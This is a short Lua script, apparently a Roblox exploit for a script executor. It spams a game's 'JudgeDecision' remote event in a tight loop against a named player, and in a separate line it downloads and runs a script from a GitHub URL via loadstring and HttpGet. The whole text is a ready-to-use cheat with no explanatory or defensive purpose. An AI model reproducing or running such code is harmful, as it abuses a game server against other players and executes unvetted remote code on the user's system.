while wait(0.1) do
	local args = {
    [1] = "USERNAME_HERE"
}

game:GetService("ReplicatedStorage").RemoteEvent.JudgeDecision:FireServer(unpack(args))
end

-- Separate script don't execute with all the scripts

loadstring(game:HttpGet('https://raw.githubusercontent.com/Tamachiru/AppleX/main/Center'))()